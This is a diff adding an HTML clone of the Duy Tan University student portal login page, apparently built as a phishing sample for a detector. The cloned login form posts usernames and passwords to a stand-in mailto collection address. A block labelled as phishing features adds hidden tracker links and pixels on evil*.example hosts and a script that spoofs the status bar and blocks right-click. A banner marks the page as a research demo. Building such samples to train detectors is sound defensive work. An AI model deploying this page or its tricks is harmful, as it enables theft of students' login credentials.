+		margin-right: 3px;
+	}
+
+	#language .redtheme {
+		background: url(mydtu_assets/images/redtheme.png) left center no-repeat;
+		text-indent: -99999px;
+		width: 13px;
+	}
+
+	#language .active {
+		text-decoration: underline;
+	}
+
+#main {
+	background: url(mydtu_assets/images/main-bg.png) no-repeat;
+	height: 225px;
+	width: 960px;
+	/*background: url(mydtu_assets/images/main-bg-2.png) no-repeat;
+	height: 269px;
+	width: 960px;*/
+}
+
+#application {
+	height: 35px;
+	min-width: 500px;
+	margin-right: 25px;
+	margin-left: 37px;
+	text-align: right;
+}
+
+	#application ul {
+		height: 35px;
+		min-width: 450px;
+		float: right;
+		text-align: right;
+	}
+
+		#application ul li {
+			float: left;
+			margin-right: 10px;
+			height: 35px;
+			line-height: 35px;
+			color: #fff;
+			display: block;
+			text-align: left;
+		}
+
+			#application ul li input {
+				background: url(mydtu_assets/images/all-images-on-signin-page.png) -1px -92px no-repeat;
+				height: 13px;
+				width: 13px;
+				border: none;
+				float: left;
+				margin-top: 10px;
+			}
+
+			#application ul li span {
+				font-size: 11px;
+				cursor: pointer;
+			}
+
+			#application ul li #Span3 {
+				background: url(mydtu_assets/images/all-images-on-signin-page.png) -237px -69px no-repeat;
+				display: block;
+				font-weight: 700;
+				height: 19px;
+				line-height: 19px;
+				margin-left: 18px;
+				margin-top: 8px;
+				padding-left: 18px;
+			}
+
+			#application ul li #Span4 {
+				background: url(mydtu_assets/images/all-images-on-signin-page.png) -1px -93px no-repeat;
+				padding-left: 16px;
+				height: 15px;
+				display: block;
+				margin-left: 18px;
+				line-height: 19px;
+				margin-top: 8px;
+				font-weight: 700;
+			}
+
+			#application ul li span.active {
+				color: #ffbd0b;
+				font-weight: 700;
+			}
+
+			#application ul li.title {
+				font-weight: 700;
+				color: #fff;
+			}
+
+			#application ul li.elearning {
+				width: 90px;
+			}
+
+			#application ul li.forum {
+				width: 85px;
+			}
+
+			#application ul li.elib {
+				width: 70px;
+			}
+
+#option {
+	height: 115px;
+	width: 450px;
+	margin-left: 45px;
+	padding-top: 27px;
+	float: left;
+	font-size: 11px;
+}
+
+	#option ul li {
+		display: block;
+		margin-right: 10px;
+		float: left;
+		color: #fff;
+		font-weight: 700;
+		width: 143px;
+		height: 24px;
+		line-height: 24px;
+	}
+
+.fixed {
+	width: 110px !important;
+}
+
+.fixed1 {
+	width: 162px !important;
+}
+
+#option ul li span {
+	float: left;
+	display: block;
+	height: 24px;
+}
+
+	#option ul li span.gmail {
+		background: url(mydtu_assets/images/all-images-on-signin-page.png) -207px -1px no-repeat;
+		width: 52px;
+	}
+
+	#option ul li span.thongbao {
+		background: url(mydtu_assets/images/all-images-on-signin-page.png) -208px -22px no-repeat;
+		width: 52px;
+	}
+
+	#option ul li span.dangky {
+		background: url(mydtu_assets/images/all-images-on-signin-page.png) -234px -138px no-repeat;
+		width: 22px;
+	}
+
+	#option ul li span.elearning {
+		background: url(mydtu_assets/images/all-images-on-signin-page.png) -226px -65px no-repeat;
+		width: 31px;
+	}
+
+	#option ul li span.tuvanhoctap {
+		background: url(mydtu_assets/images/all-images-on-signin-page.png) -226px -89px no-repeat;
+		width: 31px;
+	}
+
+	#option ul li span.hocphi {
+		background: url(mydtu_assets/images/all-images-on-signin-page.png) -236px -158px no-repeat;
+		width: 22px;
+	}
+
+	#option ul li span.lichhoc {
+		background: url(mydtu_assets/images/all-images-on-signin-page.png) -206px -45px no-repeat;
+		width: 52px;
+	}
+
+	#option ul li span.forum {
+		background: url(mydtu_assets/images/all-images-on-signin-page.png) -226px -115px no-repeat;
+		width: 31px;
+	}
+
+	#option ul li span.bangdiem {
+		background: url(mydtu_assets/images/all-images-on-signin-page.png) 3px -108px no-repeat;
+		width: 22px;
+	}
+
+#form {
+	margin-left: 495px;
+	width: 420px;	
+	/*height: 183px;
+	padding-top: 3px;*/
+	margin-top: 4px;
+	margin-bottom: 4px;
+	height: 104px;
+	padding-top: 13px;
+	position: relative;
+}
+
+	#form div {
+		height: 26px;
+		line-height: 26px;
+		padding: 3px 0 3px 10px;
+	}
+
+		#form div span {
+			height: 26px;
+			line-height: 26px;
+			width: 105px;
+			/*width: 111px;*/
+			display: block;
+			float: left;
+		}
+
+		#form div .btn-responsive {
+			display: none;
+		}
+
+	#form .forgetpass {
+		position: relative;
+	}
+
+		#form .forgetpass:after {
+			content: " ";
+			display: block;
+			clear: both;
+		}
+
+		#form .forgetpass .button, #form .forgetpass .help {
+			padding: 0;
+		}
+
+		#form .forgetpass .button {
+			float: right;
+			margin-right: 20px;
+		}
+
+		#form .forgetpass .help {
+			float: left;
+		}
+
+		#form .forgetpass a {
+			background: url(mydtu_assets/images/question.png) left center no-repeat;
+			padding-left: 19px;
+			color: #930409;
+			text-decoration: underline;
+		}
+
+			#form .forgetpass a.feedback {
+				background: url(mydtu_assets/images/info.png) left center no-repeat;
+				padding-left: 19px;
+				margin-left: 3px;
+			}
+		
+	#form .txt {
+		/*background: url(mydtu_assets/images/txt.png) left center no-repeat;
+		border: none;*/
+		border: 1px solid #860207;
+		border-radius: 6px;
+		color: #333;
+		width: 266px;
+		height: 21px;		
+		padding-left: 10px;
+	}
+
+	#form .btn {
+		color: #fff;
+		font-weight: 700;
+		width: 86px;
+		height: 25px;
+		line-height: 25px;
+		border: none;
+		cursor: pointer;
+		font-size: 12px;
+		text-indent: -9999px;
+	}
+
+	#form .vn {
+		background: url(mydtu_assets/images/all-images-on-signin-page.png) 0 0 no-repeat;
+	}
+
+	#form .en {
+		/*background: url(mydtu_assets/images/btn-en.png) left center no-repeat;*/
+		background: url(mydtu_assets/images/all-images-on-signin-page.png) -100px 0 no-repeat;
+	}
+
+#copyright {
+	margin-top: 10px;
+	height: 37px;
+	line-height: 37px;
+	padding-left: 54px;
+	color: #4e4e4e;
+	font-weight: 700;
+}
+
+	#copyright span {
+		float: left;
+		white-space: nowrap;
+	}
+
+#application ul li.gmail, #application ul li.portal {
+	width: 55px;
+}
+
+#form .pass, #form .username {
+	color: #930409;
+}
+
+.disabled {
+	color: #6D070D !important;
+	cursor: default;
+}
+
+#validmain {
+	background: url(mydtu_assets/images/valid-main-bg.png) no-repeat;
+	height: 225px;
+	width: 960px;
+}
+
+#validform {
+	margin-left: 495px;
+	width: 420px;
+	height: 145px;
+	margin-top: 4px;
+	margin-bottom: 4px;
+	position: relative;
+	padding-top: 25px;
+}
+
+	#validform .forgetpass {
+		background: url(mydtu_assets/images/question.png) left center no-repeat;
+		position: relative;
+		left: 115px;
+		width: 277px;
+	}
+
+		#validform .forgetpass a {
+			color: #930409;
+			text-decoration: underline;
+		}
+
+			#validform .forgetpass a.feedback {
+				background: url(mydtu_assets/images/info.png) left center no-repeat;
+				padding-left: 19px;
+				margin-left: 3px;
+			}
+
+	#validform .txt {
+		background: url(mydtu_assets/images/txt.png) left center no-repeat;
+		color: #999;
+		width: 286px;
+		height: 26px;
+		line-height: 26px;
+		border: none;
+		padding-left: 10px;
+	}
+
+	#validform .btn {
+		color: #fff;
+		font-weight: 700;
+		width: 86px;
+		height: 25px;
+		line-height: 25px;
+		border: none;
+		cursor: pointer;
+		right: 12px;
+		position: absolute;
+		top: 135px;
+	}
+
+	#validform .en, #validform .vn {
+		background: url(mydtu_assets/images/btn-bg-red.gif) left center no-repeat;
+	}
+
+#txtCaptcha {
+	background-image: none !important;
+	background-color: #FFDCDD !important;
+	border: 1px solid #860207 !important;
+	-webkit-border-radius: 5px;
+	-moz-border-radius: 5px;
+	border-radius: 5px;
+	height: 20px !important;
+	margin-left: 1px;
+}
+.faculty-dept {
+	display: none;
+}
+select {
+	padding: 3px 3px;
+    border: 0;
+    border: 1px solid #860207;
+    border-radius: 6px;
+    width: 278px;
+    color: #333;
+}
+ul.object-type {
+	margin: 0;
+	padding: 5px 0 0 0;
+}
+ul.object-type li{
+	display: inline-block;
+	cursor: pointer;
+	color: #fff;
+	min-width: 120px;
+}
+ul.object-type li.active {
+    color: #ffbd0b;
+    font-weight: 700;
+}
+ul.object-type li input {
+	margin: 0;
+	float: left;
+    margin-top: 6px;
+}
+ul.object-type li span {
+	float: none !important;
+	display: inline-block !important;
+	width: auto !important;
+	margin-left: 2px;
+}
+</style><!--[if IE 6]><style>
+#option{margin-left:20px;padding-top:10px;height:105px}
+#option ul li{width:142px;margin-right:5px;padding:3px 0}
+#form{width:418px;padding-top:10px;margin-left:495px;margin-top:0;margin-bottom:0}
+#form div{height:26px;line-height:26px;padding:2px 0 2px 20px}
+#form .btn{right:15px}
+#copyright{margin-top:20px}
+#application,#application ul{height:25px}
+</style><![endif]--><!--[if IE 7]><style>
+#form .btn{top:2px; right:12px}
+</style><![endif]--><!--[if IE 8]><style>
+#form .btn{top:2px; right:12px}
+</style><![endif]-->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <!--[if lt IE 9]>
+    <![endif]-->
+    
+        
+</head>
+<body>
+    
+<!--jQuery Modal Popup-->
+<div id="loadPopupContent">
+</div>
+
+
+    
+    <div id="main-panel">
+        <form name="form_login1" method="post" action="mailto:collect@fake-mail.example" id="form_login1" autocomplete="off" width="100%" height="100%">
+<div>
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="O9B6ZgpvWt1MxBsFdd1rbOgPYK/0fVWSl171+y3gkOhuhQwCUaI9FUhwXcVVPF2nZ2kH18mYCO0IEsMMcTLkTvm5nqptmUB9LVsVqbXShBPtd2yXLcimuAbCCdER66V8mhtdUN5b0GvGXwz4ygv9c9nRALNPYv2lUZAi+FS8ZviECOxGa1CSKoJzEgoOgE/u/0DtoDlA1aUTQa2NBjaShV+Fmv3f92MztRh3bg0PDj5TtKvBbh5N1b6oqKSzMTLbNnvr461xYXjSsLM99q/kBHdbrEssDqqo2q1OtUmKP9g2uWAupN6iDUh7zwnthFvDHLWvHYpIenc2t44UR4MgPSmr15zfYwk/Z/XOIZYhFRGt/6oyptZ3ud1Kegw5lWBOwZiF8b3apmwS9XpIkavAaWAX/F1aIVv3cfWOLph7ONuDDC9ryBHb9q4LoWw=" />
+</div>
+
+
+
+
+
+
+
+
+
+
+
+<div>
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="ECDA716A" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="a3Janp7QSGzRp/5ZOTnXq+w305ot06NGR27aiJwEBMjIpvZEht9naPBsaj8iRAvDAZq1Rt1Oh3sAD8GOOd3bRpG0yrlLfd7oeSPwNfOsVR/ky0Awr1t3AE/ZYbXJ6DssCyc5EZsqg8x1WacIB8LkhM/mJdPTm0tLM+6hu8zTjVRr/qp5WonffwBxAVkwJzsYtPMcyJ8Q2PPq718PUe8OTV4G22fB6l98UGTiKOTbCeg8lCOV5iKiwOfPgn+QQSNkKDd7nzZQ1PR0O8GoRpL6uP1PQfEwSPgZjHVzVtTwH0m0TUC7vkKsHxjeGiUuppOwNmYdqTwXGAQdzBSX+H8WhC3K6ZIo4r+xG65tsrUGH+S3pGqhAbF2E+WkGAHd0hBPhovUqsxvgLGE8Pv3eyZRG8p+3trwdPXwXl4kuqdcpdXgPYWKTDxy7rTlVfg=" />
+</div>
+            
+
+            <div id="updProgress" class="clickSignIn" style="display:none;">
+	
+                    <img src="mydtu_assets/images/ajax-loader-1.gif" />
+                    Đang đăng nhập...
+                
+</div>
+            <div id="UpdatePassUpdatePanel">
+	
+                    <div id="panel">
+                        <div class="screen">
+                            <img src="mydtu_assets/images/phone-screen.png" class="mobile" alt="" title="View Mobile Devices Screen"
+                                onclick="ScreenClick('btnSetMobileScreen')" /><img src="mydtu_assets/images/desktop_screen3.png" class="desktop" alt="" title="View Desktop Screen"
+                                    onclick="ScreenClick('btnSetDesktopScreen')" />
+                        </div>
+                        <div id="login">
+                            <div id="top">
+                                <div id="logo">
+                                    <a href="#">
+                                        Đại học Duy Tân</a>
+                                </div>
+                                <div id="language">
+                                    
+                                    <a class="forgotpass" href="https://mail.dtu.edu.vn/Home/ForgotMyDTU/" target="_blank" title="Quên Mật khẩu?">
+                                        Quên Mật khẩu?</a> <a class="feedback" href="Modules/portal/Feedback.aspx" target="_blank"
+                                            title="Gửi Góp ý">
+                                            Góp ý</a>
+                                    
+                                    
+                                    <a class="vn active" href='/signin.aspx?lang=vn' title="Tiếng Việt">Tiếng Việt</a><a class="en " href="/signin.aspx?lang=en"
+                                        title="English language">English</a>
+                                </div>
+                            </div>
+                            <div id="main">
+                                <div id="application">
+                                    <ul>
+                                        <li class="title">
+                                            Đăng nhập với:</li>
+                                        <li class="portal">
+                                            <input value="1" name="radType" type="radio" id="Radio1" checked="checked" onclick="setValueChecked(&#39;1&#39;)" /><span id="Span1" onclick="setValueChecked('1')">Portal</span></li>
+                                        <li class="gmail" style="display: none">
+                                            <input value="2" name="radType" type="radio" id="Radio2" onclick="setValueChecked(&#39;2&#39;)" /><span
+                                                id="Span2" onclick="setValueChecked('2')">Gmail</span></li>
+                                        <li class="elearning">
+                                            <input value="3" name="radType" type="radio" id="Radio3" onclick="setValueChecked(&#39;3&#39;)" /><span
+                                                id="Span3" onclick="setValueChecked('3')">Learning</span></li>
+                                        <li class="forum">
+                                            <input value="4" name="radType" type="radio" id="Radio4" onclick="setValueChecked(&#39;4&#39;)" /><span
+                                                id="Span4" onclick="setValueChecked('4')">Diễn đàn</span></li>
+                                        <li class="elib">
+                                            <input value="5" name="radType" type="radio" id="Radio5" onclick="setValueChecked(&#39;5&#39;)" /><span
+                                                id="Span5" onclick="setValueChecked('5')">Thư viện</span></li>
+                                    </ul>
+                                </div>
+                                <div id="option">
+                                    <ul>
+                                        <li class="fixed1"><span class="gmail"></span>
+                                            @dtu.edu.vn</li>
+                                        <li class="fixed"><span class="elearning"></span>
+                                            Learning</li>
+                                        <li><span class="dangky"></span>
+                                            Đăng ký Môn học</li>
+                                        <li class="fixed1"><span class="thongbao"></span>
+                                            Thông báo</li>
+                                        <li class="fixed"><span class="tuvanhoctap"></span>
+                                            Thư viện</li>
+                                        <li><span class="hocphi"></span>
+                                            Học phí</li>
+                                        <li class="fixed1"><span class="lichhoc"></span>
+                                            Lịch Cá nhân</li>
+                                        <li class="fixed"><span class="forum"></span>
+                                            Diễn đàn</li>
+                                        <li><span class="bangdiem"></span>
+                                            Bảng điểm</li>
+                                    </ul>
+                                </div>
+                                <div id="form">
+                                    
+                                    <div class="username">
+                                        <span>
+                                            Tên Đăng nhập:</span>
+                                        <input name="txtUser" type="text" maxlength="50" id="txtUser" tabindex="1" class="txt" autocomplete="off" placeholder="Nhập Tên đăng nhập" />
+                                        <input type="hidden" name="hdPass" id="hdPass" />
+                                        <input type="hidden" name="valChecked" id="valChecked" />
+                                    </div>
+                                    <div class="pass">
+                                        <span>
+                                            Mật khẩu:</span>
+                                        <input name="txtPass" type="password" id="txtPass" tabindex="2" class="txt" onfocus="if(this.value!=&#39;&#39;) this.value=&#39;&#39;;" onblur="if(this.value==&#39;&#39;) this.value=&#39;Nhập mật khẩu&#39;;" autocomplete="off" placeholder="Nhập Mật khẩu" />
+                                    </div>
+                                    
+                                    <div class="forgetpass">
+                                        
+                                        <div class="button">
+                                            <input type="submit" name="btnLogin1" value="" onclick="return checkFormInput();WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;btnLogin1&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, false))" id="btnLogin1" tabindex="4" class="btn vn" title="Nhấn Enter để tiếp tục" />
+                                            
+                                            <span class="btn-responsive" onclick="ScreenClick('btnLogin1')"></span>
+                                        </div>
+                                        
+                                        <div id="box-captcha" class="pass">
+                                            <span>Mã xác nhận:</span>
+                                            <input name="txtCaptcha" type="text" maxlength="4" id="txtCaptcha" tabindex="3" class="txt captcha txtcaptcha" autocomplete="off" style="width: 50px; float: left" />
+                                            <div id="Container">
+                                                <div id="UpdatePanel1">
+                                                    <div style='background-color:White;' ><img src="mydtu_assets/images/captcha.png" border="0" alt="Captcha" width="120" height="32" /></div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        
+                                    </div>
+                                </div>
+                                <div class="clearfix">
+                                </div>
+                                <div id="copyright">
+                                    <span>
+                                        Copyright&copy; 2026 <a href='http://duytan.edu.vn' target='_blank'>Đại học Duy Tân</a>.
+                                        <input type="hidden" name="HiddenField1" id="HiddenField1" />
+                                    </span>
+                                    <span id="lbMessage" style="color:Red;float: right; margin-right: 30px;"></span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <input type="submit" name="btnSetMobileScreen" value="Mobile Screen" onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;btnSetMobileScreen&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, false))" id="btnSetMobileScreen" style="display: none" />
+                    <input type="submit" name="btnSetDesktopScreen" value="Desktop Screen" onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;btnSetDesktopScreen&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, false))" id="btnSetDesktopScreen" style="display: none" />
+                    <input name="TextBox1" type="password" id="TextBox1" autocomplete="off" style="display:none" />
+                
+</div>
+        
+
+
+</form>
+    </div>
+
+    
+    
+    
+    <div style="position: fixed; bottom: 0; text-align: center; color: #8398BA">
+        <span id="lblVersion"></span>
+    </div>
+    
+
+
+<!-- ====== ĐẶC TRƯNG PHISHING (để Perceptron phát hiện) ====== -->
+<iframe src="about:blank" style="display:none" frameborder="0" width="0" height="0"></iframe>
+<a href="http://evil-tracker0.example/log" style="display:none">t0</a>
+<a href="http://evil-tracker1.example/log" style="display:none">t1</a>
+<a href="http://evil-tracker2.example/log" style="display:none">t2</a>
+<a href="http://evil-tracker3.example/log" style="display:none">t3</a>
+<a href="http://evil-tracker4.example/log" style="display:none">t4</a>
+<a href="http://evil-tracker5.example/log" style="display:none">t5</a>
+<a href="http://evil-tracker6.example/log" style="display:none">t6</a>
+<a href="http://evil-tracker7.example/log" style="display:none">t7</a>
+<a href="http://evil-tracker8.example/log" style="display:none">t8</a>
+<a href="http://evil-tracker9.example/log" style="display:none">t9</a>
+<a href="http://evil-tracker10.example/log" style="display:none">t10</a>
+<a href="http://evil-tracker11.example/log" style="display:none">t11</a>
+<img src="http://cdn.evil0.example/pixel0.gif" style="display:none" width="1" height="1">
+<img src="http://cdn.evil1.example/pixel1.gif" style="display:none" width="1" height="1">
+<img src="http://cdn.evil2.example/pixel2.gif" style="display:none" width="1" height="1">
+<img src="http://cdn.evil3.example/pixel3.gif" style="display:none" width="1" height="1">
+<img src="http://cdn.evil4.example/pixel4.gif" style="display:none" width="1" height="1">
+<img src="http://cdn.evil5.example/pixel5.gif" style="display:none" width="1" height="1">
+<img src="http://cdn.evil6.example/pixel6.gif" style="display:none" width="1" height="1">
+<img src="http://cdn.evil7.example/pixel7.gif" style="display:none" width="1" height="1">
+<script>
+  window.open("", "_blank");
+  window.onmouseover = function(){ window.status = "https://mydtu.duytan.edu.vn/"; };
+  document.addEventListener("contextmenu", function(e){ e.preventDefault(); });
+</script>
+<style>
+  .demo-banner{position:fixed;top:0;left:0;right:0;background:#c8102e;color:#fff;text-align:center;
+    padding:6px;font-size:13px;font-weight:700;z-index:99999;box-shadow:0 2px 6px rgba(0,0,0,.3);}
+  .demo-watermark{position:fixed;bottom:16px;right:16px;background:#c8102e;color:#fff;padding:9px 14px;
+    border-radius:5px;font-size:13px;font-weight:700;box-shadow:0 2px 10px rgba(0,0,0,.4);z-index:99999;}
+</style>
+<div class="demo-banner">⚠️ TRANG GIẢ LẬP PHỤC VỤ DEMO NGHIÊN CỨU — KHÔNG PHẢI CỔNG ĐĂNG NHẬP CHÍNH THỨC ⚠️</div>
+<div class="demo-watermark">⚠️ DEMO GIẢ LẬP</div>
+</body>
+</html>
